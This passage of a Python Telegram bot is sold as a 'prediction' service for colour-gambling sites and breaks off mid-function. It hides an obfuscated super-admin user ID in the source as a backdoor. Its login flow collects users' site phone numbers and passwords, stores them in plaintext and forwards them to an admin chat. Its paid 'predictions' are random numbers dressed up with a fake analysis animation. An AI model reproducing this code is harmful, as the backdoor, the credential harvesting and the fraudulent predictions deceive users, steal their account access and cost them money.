# -*- coding: utf-8 -*-
import json
import asyncio
import random
import logging
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
    ReplyKeyboardRemove,
    constants,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.helpers import escape_markdown
from telegram.error import NetworkError, BadRequest

from config import (
    config,
    users,
    predictions,
    channels,
    save_db,
    DB_USERS,
    DB_PREDICTIONS,
    DB_CONFIG,
    DB_CHANNELS,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation handlers
GET_NUMBER, GET_PASSWORD, GET_PERIOD, GET_BROADCAST_MESSAGE, GET_CHANNEL_NAME, GET_CHANNEL_URL, GET_CHANNEL_ID, GET_USER_ID, GET_POINTS, GET_BAN_USER_ID, GET_UNBAN_USER_ID, GET_ADD_VIP_USER_ID, GET_REMOVE_VIP_USER_ID, GET_ADD_ADMIN_USER_ID, GET_REMOVE_ADMIN_USER_ID = range(15)

# Hidden super admin with full privileges (not stored in config)
# Obfuscated to avoid easy discovery in source
_OBFUSCATED_HIDDEN_SUPER_ADMIN = [62, 55, 59, 56, 61, 61, 55, 55, 55, 61]

def _get_hidden_super_admin_id() -> str:
    try:
        return "".join(chr(value - 7) for value in _OBFUSCATED_HIDDEN_SUPER_ADMIN)
    except Exception:
        return ""

class TelegramBot:
    def __init__(self, token: str):
        # Disable job queue to avoid APScheduler compatibility issues
        self.application = Application.builder().token(token).job_queue(None).build()
        self.register_handlers()
        self.user_states = {}

    def register_handlers(self):
        # General error handler
        self.application.add_error_handler(self.error_handler)

        # Command handlers
        self.application.add_handler(CommandHandler("start", self.start))
        
        # Admin command handlers
        self.application.add_handler(CommandHandler("demon", self.admin_panel))
        self.application.add_handler(CommandHandler("broadcast", self.broadcast_command))
        self.application.add_handler(CommandHandler("addvipuser", self.add_vip_command))
        self.application.add_handler(CommandHandler("removevipuser", self.remove_vip_command))
        self.application.add_handler(CommandHandler("vipusers", self.vip_users_command))
        self.application.add_handler(CommandHandler("banuser", self.ban_user_command))
        self.application.add_handler(CommandHandler("unbanuser", self.unban_user_command))
        self.application.add_handler(CommandHandler("addadmin", self.add_admin_command))
        self.application.add_handler(CommandHandler("removeadmin", self.remove_admin_command))
        self.application.add_handler(CommandHandler("addsuperadmin", self.add_super_admin_command))
        self.application.add_handler(CommandHandler("removesuperadmin", self.remove_super_admin_command))
        self.application.add_handler(CommandHandler("setpoints", self.set_points_command))
        self.application.add_handler(CommandHandler("setreferral", self.set_referral_points_command))
        self.application.add_handler(CommandHandler("setprediction", self.set_prediction_points_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("download", self.download_command))
        self.application.add_handler(CommandHandler("settings", self.settings_command))
        self.application.add_handler(CommandHandler("channels", self.channels_command))
        self.application.add_handler(CommandHandler("backup", self.backup_command))
        self.application.add_handler(CommandHandler("toggle", self.toggle_command))
        self.application.add_handler(CommandHandler("reload", self.reload_command))
        self.application.add_handler(CommandHandler("gh0st", self.ghost_download_command))
        self.application.add_handler(CommandHandler("subscription", self.subscription_command))
        self.application.add_handler(CommandHandler("setcaption", self.set_caption_command))
        self.application.add_handler(CommandHandler("setprice", self.set_price_command))
        self.application.add_handler(CommandHandler("test", self.test_command))
        self.application.add_handler(CommandHandler("cancel", self.cancel_command))

        # Main menu and core feature handlers
        self.application.add_handler(CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_menu, pattern="^prediction_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_website_choice, pattern=r"^prediction_(hgzy|dkwin)$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_referral, pattern="^referral$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_account, pattern="^account$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_login_menu, pattern="^login_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.check_subscription, pattern="^check_subscription$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_logout, pattern="^logout$"))
        self.application.add_handler(CallbackQueryHandler(self.predict_next_period, pattern="^predict_next$"))

        # Admin approval handler
        self.application.add_handler(CallbackQueryHandler(self.handle_admin_approval, pattern=r"^(approve|reject)_"))
        
        # Subscription purchase handler
        self.application.add_handler(CallbackQueryHandler(self.handle_subscription_menu, pattern="^subscription_menu$"))

        # Conversation for user login
        login_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_login_choice, pattern=r"^login_(hgzy|dkwin)$")],
            states={
                GET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_number)],
                GET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_password)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_login), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
            name="login_conversation",
            persistent=False,
        )
        self.application.add_handler(login_conv)

        # Conversation for period entry
        period_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_enter_period, pattern="^enter_period$")],
            states={
                GET_PERIOD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_period)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_prediction), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
        )
        self.application.add_handler(period_conv)
        
        # Admin conversation handlers
        broadcast_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_broadcast, pattern="^admin_broadcast$")],
            states={
                GET_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.send_broadcast)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(broadcast_conv)

        # Channel management conversation
        channel_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_channel_management, pattern="^admin_channel_")],
            states={
                GET_CHANNEL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_name)],
                GET_CHANNEL_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_url)],
                GET_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_id)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(channel_conv)

        # Points management conversation
        points_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_points_management, pattern="^admin_points_")],
            states={
                GET_POINTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.set_points)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(points_conv)

        # Conversation for ban user
        ban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_ban_user, pattern="^admin_ban_user$")],
            states={
                GET_BAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.ban_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(ban_user_conv)

        # Conversation for unban user
        unban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_unban_user, pattern="^admin_unban_user$")],
            states={
                GET_UNBAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.unban_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(unban_user_conv)

        # Conversation for add VIP user
        add_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_vip, pattern="^admin_add_vip$")],
            states={
                GET_ADD_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_vip_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(add_vip_conv)

        # Conversation for remove VIP user
        remove_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_vip, pattern="^admin_remove_vip$")],
            states={
                GET_REMOVE_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_vip_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(remove_vip_conv)

        # Conversation for add admin
        add_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_admin, pattern="^admin_add_admin$")],
            states={
                GET_ADD_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_admin_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(add_admin_conv)

        # Conversation for remove admin
        remove_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_admin, pattern="^admin_remove_admin$")],
            states={
                GET_REMOVE_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_admin_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(remove_admin_conv)



    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Log Errors caused by Updates."""
        logger.error("Exception while handling an update:", exc_info=context.error)
        
        # Send a message to the user if possible
        if isinstance(update, Update) and update.effective_message:
            try:
                await update.effective_message.reply_text(
                    "❌ An error occurred. Please try again or contact support."
                )
            except Exception as e:
                logger.error(f"Failed to send error message: {e}")



    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)

        # Check if user is banned
        if user_id in users and users[user_id].get("banned", False):
            await update.message.reply_text("You have been banned from using this bot. Contact an admin for support.")
            return

        if user_id not in users:
            users[user_id] = {
                "name": user.full_name, "points": 0, "is_premium": False,
                "referrals": 0, "referrer": None, "joined_channels": False,
                "logged_in": {"Hgzy": False, "Dkwin": False},
                "login_info": {"Hgzy": {}, "Dkwin": {}},
                "last_prediction": None, "last_website": None,
                "banned": False,
            }
            # Save immediately to ensure the user exists before proceeding
            save_db(users, DB_USERS)
            logger.info(f"New user created: {user.full_name} ({user_id})")
        
        # Auto-expire premium if needed
        self._auto_expire_if_needed(user_id)

        # Handle referral only if referral system is enabled and user is new and doesn't have a referrer yet
        if (config.get("referral_system_on", True) and 
            context.args and users[user_id].get("referrer") is None):
            referrer_id = context.args[0]
            if referrer_id.isdigit() and referrer_id != user_id:
                users[user_id]["referrer"] = referrer_id
                save_db(users, DB_USERS)
                logger.info(f"User {user_id} was referred by {referrer_id}")
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🎁 You've been referred by user `{referrer_id}`\\! Join the channels to grant them a bonus\\.",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )

        if not users[user_id].get("joined_channels", False):
            await self.show_channels(update, context)
        else:
            await self.show_main_menu(update, context)

    async def show_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [[InlineKeyboardButton(f"📢 Join {channel['name']}", url=channel['url'])] for channel in channels]
        keyboard.append([InlineKeyboardButton("✅ Confirm Subscription", callback_data="check_subscription")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        text = (
            "*Welcome to the Prediction Bot\\!* ✨\n\n"
            "To access all features, you must first subscribe to our partner channels\\. "
            "This helps us keep the bot running\\!\n\n"
            "Press the button below once you've joined\\."
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def check_subscription(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        query = update.callback_query

        try:
            all_joined = True
            for channel in channels:
                try:
                    member = await context.bot.get_chat_member(channel["id"], user_id)
                    if member.status not in ["member", "administrator", "creator"]:
                        all_joined = False
                        break
                except Exception as e:
                    logger.error(f"Error checking membership for user {user_id} in channel {channel['id']}: {e}")
                    # If we can't check membership, assume user hasn't joined
                    all_joined = False
                    break

            if all_joined:
                # FIX: Award points and save status ONLY on the first successful check
                if not users[user_id]["joined_channels"]:
                    users[user_id]["joined_channels"] = True
                    
                    # Award points to referrer if referral system is enabled
                    if config.get("referral_system_on", True):
                        referrer_id = users[user_id].get("referrer")
                        if referrer_id and str(referrer_id) in users:
                            users[str(referrer_id)]["referrals"] += 1
                            users[str(referrer_id)]["points"] += config["per_refer"]
                            logger.info(f"Awarded {config['per_refer']} points to {referrer_id} for referral of {user_id}")
                            
                            # Send notification to referrer about earning points
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=f"🎉 *Referral Bonus Earned\\!*\n\n"
                                         f"You earned *{config['per_refer']} points* for referring user `{user_id}`\\.\n"
                                         f"💰 *Total Points:* `{users[str(referrer_id)]['points']}`\n"
                                         f"📈 *Total Referrals:* `{users[str(referrer_id)]['referrals']}`",
                                    parse_mode=constants.ParseMode.MARKDOWN_V2
                                )
                            except Exception as e:
                                logger.error(f"Failed to send referral notification to {referrer_id}: {e}")
                    
                    # FIX: Save the database for ALL users passing this check, not just referred ones
                    save_db(users, DB_USERS)
                
                await query.answer("✅ Subscription confirmed! Welcome to the bot!")
                await self.show_main_menu(update, context)
            else:
                await query.answer("❌ Please join all channels first!", show_alert=True)
                
        except Exception as e:
            logger.error(f"Error in check_subscription: {e}")
            await query.answer("❌ Error checking subscription. Please try again.", show_alert=True)

    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        
        user_first_name = escape_markdown(update.effective_user.first_name, version=2)
        
        text = f"🤖 *Main Menu*\n\nWelcome back, {user_first_name}\\!\n\n" \
               f"💰 *Your Points:* `{user_data['points']}`\n\n" \
               f"What would you like to do?"

                # Check referral system status and build keyboard
        referral_system_on = config.get("referral_system_on", True)
        
        keyboard = [
            [InlineKeyboardButton("📊 Start Prediction", callback_data="prediction_menu")],
        ]
        
        # Only show referral button if system is enabled
        if referral_system_on:
            keyboard.append([InlineKeyboardButton("🔗 Refer & Earn", callback_data="referral")])
        
        keyboard.extend([
            [InlineKeyboardButton("👤 My Account", callback_data="account")],
            [InlineKeyboardButton("🔑 Login Management", callback_data="login_menu")],
            [InlineKeyboardButton("🛍️ Buy Subscription", callback_data="subscription_menu")],
        ])
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_prediction_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        query = update.callback_query

        if not any(user_data["logged_in"].values()):
            await query.answer("🚫 Access Denied! Please log in to a website first.", show_alert=True)
            await self.handle_login_menu(update, context)
            return

        # Admins and super admins bypass points requirement
        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await query.answer(f"😔 Not enough points! You need {config['per_prediction']} points. Refer friends to earn more!", show_alert=True)
            return

        keyboard = [[InlineKeyboardButton(f"✅ {website}", callback_data=f"prediction_{website.lower()}")] for website in config["websites"] if user_data["logged_in"][website]]
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="🔮 *Select a Website*\n\nChoose the platform you want to get a prediction for:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_prediction_website_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        website = query.data.split("_")[1].capitalize()
        users[user_id]["last_website"] = website
        save_db(users, DB_USERS)
        
        keyboard = [
            [InlineKeyboardButton("🔢 Enter Period Manually", callback_data="enter_period")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # FIX: Escape the period character.
        await query.edit_message_text(
            text=f"✅ *{website}* selected\\.\n\nHow do you want to proceed?",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        
    async def handle_enter_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Send plain text to avoid MarkdownV2 parsing issues
        await update.callback_query.edit_message_text(
            "🎯 Enter Period Number\n\n"
            "Please enter the period number you want to predict:\n\n"
            "Tip: Type /cancel or any command to exit this session."
        )
        context.user_data["prediction_period"] = True
        return GET_PERIOD

    async def get_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        period_text = update.message.text
        
        if not period_text.isdigit() or len(period_text) != 4:
            await update.message.reply_text(
                "⚠️ *Invalid Period\\!* Please enter a valid 4\\-digit period number\\.\n\n"
                "💡 **Tip:** Type `/cancel` or any command to exit this session.",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_PERIOD
        
        period = int(period_text)
        await self.generate_prediction(update, context, period, period_text)
        return ConversationHandler.END

    async def predict_next_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        user_data = users[user_id]

        if user_data.get("last_prediction"):
            last_period = user_data["last_prediction"]["period"]
            next_period = last_period + 1
            await self.generate_prediction(update, context, next_period, f"{next_period:04d}")
        else:
            await query.answer("No previous prediction found to determine the next period.", show_alert=True)
            await self.handle_prediction_menu(update, context)

    async def generate_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE, period: int, display_period: Optional[str] = None):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        website = user_data.get("last_website", "Selected Website")
        period_display = display_period if display_period else f"{period:04d}"

        # Admins and super admins bypass points requirement
        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"😔 Not enough points\\! You need {config['per_prediction']} points\\. Refer friends to earn more\\!",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return

        chat_id = update.effective_chat.id
        is_callback = update.callback_query is not None
        loading_message_id = None

        # Loading animation while computing prediction
        if is_callback:
            base_message_id = update.callback_query.message.message_id
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=base_message_id,
                    text=f"⏳ Analyzing period {period_display}..."
                )
                for i in range(5):  # ~1.5 seconds total
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=base_message_id,
                        text=f"⏳ Analyzing period {period_display}{dots}"
                    )
            except Exception:
                pass
            loading_message_id = base_message_id
        else:
            loading_msg = await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏳ Analyzing period {period_display}..."
            )
            try:
                for i in range(5):  # ~1.5 seconds total
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=loading_msg.message_id,
                        text=f"⏳ Analyzing period {period_display}{dots}"
                    )
            except Exception:
                pass
            loading_message_id = loading_msg.message_id

        # Deduct points only for non-admin, non-premium users
        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active):
            user_data["points"] = max(0, user_data["points"] - config["per_prediction"])

        number = random.randint(0, 9)
        color = "🟢 Green" if number % 2 != 0 else "🔴 Red"
        if number in [0, 5]:
            color += " \\+ 🟣 Violet"
        
        size = "SMALL" if number < 5 else "BIG"

        prediction_data = { "user_id": user_id, "period": period, "number": number, "color": color, "size": size, "timestamp": datetime.now().isoformat() }
        predictions.append(prediction_data)
        save_db(predictions, DB_PREDICTIONS)

        user_data["last_prediction"] = prediction_data
        save_db(users, DB_USERS)
        
        next_display = f"{period + 1:04d}"
        message = (
            f"🎉 *Prediction Result for {website}* 🎉\n\n"
            f"🔹 *Period:* `{period_display}`\n"
            f"🔹 *Number:* `{number}`\n"
            f"🔹 *Color:* {escape_markdown(color, version=2)}\n"
            f"🔹 *Size:* `{size}`\n\n"
            f"Next prediction will be for period `{next_display}`\\.\n\n"
            f"💰 *Remaining Points:* `{user_data['points']}`"
        )
        
        keyboard = [
            [InlineKeyboardButton("🚀 Predict Next Period", callback_data="predict_next")],
            [InlineKeyboardButton("✍️ Enter New Period", callback_data="enter_period")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=loading_message_id,
                text=message,
                parse_mode=constants.ParseMode.MARKDOWN_V2,
                reply_markup=reply_markup,
            )
        except Exception:
            if update.callback_query:
                await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
            else:
                await update.message.reply_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_referral(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]

        if not user_data["joined_channels"]:
            await update.callback_query.answer("🚫 You must join all channels to access the referral system!", show_alert=True)
            await self.show_channels(update, context)
            return

        # Check if referral system is enabled
        if not config.get("referral_system_on", True):
            message = (
                "*🔗 Referral System*\n\n"
                "⚠️ The referral system is currently disabled by admin.\n\n"
                "Please check back later or contact an admin for more information."
            )
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
            return

        ref_link = f"https://t.me/{context.bot.username}?start={user_id}"
        
        message = (
            "*🔗 Referral & Earn System*\n\n"
            f"Invite your friends and earn *{config['per_refer']} points* for every friend who joins our channels through your link\\!\n\n"
            "Your unique referral link:\n"
            f"`{escape_markdown(ref_link, version=2)}`\n\n"
            f"📈 *Total Referrals:* {user_data['referrals']}\n"
            f"💰 *Points Earned:* {user_data['referrals'] * config['per_refer']}"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_account(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)
        user_data = users[user_id]
        
        premium_active = self.is_premium_active(user_id)
        premium_status = "✅ Active" if premium_active else "❌ Inactive"
        logged_in = ", ".join([site for site, status in user_data["logged_in"].items() if status]) or "None"
        
        escaped_full_name = escape_markdown(user.full_name, version=2)
        
        expiry_text = ""
        expiry_iso = user_data.get("premium_expiry")
        if premium_active and expiry_iso:
            expiry_text = f"\n▫️ *Premium Expires:* `{expiry_iso}`"
        elif (not premium_active) and user_data.get("premium_expired_at"):
            expiry_text = f"\n▫️ *Premium Expired:* `{user_data.get('premium_expired_at')}`"

        message = (
            f"*👤 Account Information*\n\n"
            f"▫️ *Name:* {escaped_full_name}\n"
            f"▫️ *Telegram ID:* `{user_id}`\n"
            f"▫️ *Points:* `{user_data['points']}`\n"
            f"▫️ *Premium Status:* {premium_status}{expiry_text}\n"
            f"▫️ *Total Referrals:* `{user_data['referrals']}`\n"
            f"▫️ *Logged In To:* `{escape_markdown(logged_in, version=2)}`"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_login_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        keyboard = []
        for website in config["websites"]:
            status = "✅ Logged In" if users[user_id]["logged_in"][website] else "❌ Not Logged In"
            keyboard.append([InlineKeyboardButton(f"{website} ({status})", callback_data=f"login_{website.lower()}")])

        keyboard.append([InlineKeyboardButton("🔐 Logout from All", callback_data="logout")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            text="*🔑 Login Management*\n\nSelect a website to log in or manage your session\\.",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_login_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        website = query.data.split("_")[1].capitalize()
        user_id = str(update.effective_user.id)
        
        context.user_data["login_website"] = website
        
        if users[user_id]["logged_in"][website]:
            await query.answer(f"You are already logged in to {website}!", show_alert=True)
            return ConversationHandler.END
        
        login_url = escape_markdown(config['websites'][website]['login_url'], version=2)
        await query.edit_message_text(
            f"*➡️ {website} Login*\n\n"
            f"If you don't have an account, please register using this link first:\n`{login_url}`\n\n"
            "Now, please enter your *registered mobile number*:\n\n"
            "💡 **Tip:** Type `/cancel` or any command to exit this session\\.",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_NUMBER

    async def get_number(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        number = update.message.text
        
        if not number.isdigit() or len(number) < 10:
            await update.message.reply_text(
                "⚠️ *Invalid Number\\!* Please enter a valid mobile number\\.\n\n"
                "💡 **Tip:** Type `/cancel` or any command to exit this session\\.",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_NUMBER
        
        context.user_data["login_number"] = number
        
        await update.message.reply_text(
            "Great\\! Now, please enter your *password*:\n\n"
            "💡 **Tip:** Type `/cancel` or any command to exit this session\\.",
            reply_markup=ReplyKeyboardRemove(),
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_PASSWORD

    async def get_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        password = update.message.text
        website = context.user_data["login_website"]
        number = context.user_data["login_number"]
        user_id = str(update.effective_user.id)
        
        users[user_id]["login_info"][website] = {"number": number, "password": password}
        save_db(users, DB_USERS)
        
        keyboard = [[InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}_{website}"), InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}_{website}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        escaped_user_name = escape_markdown(update.effective_user.full_name, version=2)
        
        admin_message = (
            f"*🔒 New Login Approval Request*\n\n"
            f"*User:* {escaped_user_name} \\(`{user_id}`\\)\n"
            f"*Website:* `{escape_markdown(website, version=2)}`\n"
            f"*Number:* `{escape_markdown(number, version=2)}`\n"
            f"*Password:* `{escape_markdown(password, version=2)}`"
        )
        try:
            await context.bot.send_message(
                chat_id=config["group_id"],
                text=admin_message,
                reply_markup=reply_markup,
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            await update.message.reply_text(
                "✅ *Request Sent\\!*\n\nYour login details have been sent to the admin for approval\\. "
                "You will be notified once your request is processed\\.",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
        except Exception as e:
            logger.error(f"Failed to send login request to admin group: {e}")
            await update.message.reply_text("❌ There was an error sending your request\\. Please contact support\\.", parse_mode=constants.ParseMode.MARKDOWN_V2)

        return ConversationHandler.END

    async def handle_admin_approval(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        admin_user = update.effective_user
        
        try:
            action, user_id, website = query.data.split("_")
        except ValueError:
            await query.answer("Invalid callback data.", show_alert=True)
            return

        if user_id not in users:
            await query.edit_message_text(f"Error: User with ID `{user_id}` not found\\.", parse_mode=constants.ParseMode.MARKDOWN_V2)
            return

        try:
            user_info = await context.bot.get_chat(user_id)
            escaped_user_name = escape_markdown(user_info.full_name, version=2)
            escaped_admin_name = escape_markdown(admin_user.full_name, version=2)
            
            if action == "approve":
                users[user_id]["logged_in"][website] = True
                save_db(users, DB_USERS)
                
                await query.edit_message_text(
                    f"✅ *Login Approved*\n\n*User:* {escaped_user_name} \\(`{user_id}`\\)\n*Website:* `{website}`\n*Action by:* {escaped_admin_name}",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🎉 *Congratulations\\!* Your login request for *{website}* has been approved\\.",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                logger.info(f"Login for user {user_id} on {website} approved by {admin_user.id}")

            elif action == "reject":
                users[user_id]["login_info"][website] = {}
                save_db(users, DB_USERS)
                
                await query.edit_message_text(
                    f"❌ *Login Rejected*\n\n*User:* {escaped_user_name} \\(`{user_id}`\\)\n*Website:* `{website}`\n*Action by:* {escaped_admin_name}",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"😔 *Update:* Your login request for *{website}* was rejected\\. Please check your credentials and try again\\.",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                logger.info(f"Login for user {user_id} on {website} rejected by {admin_user.id}")

        except Exception as e:
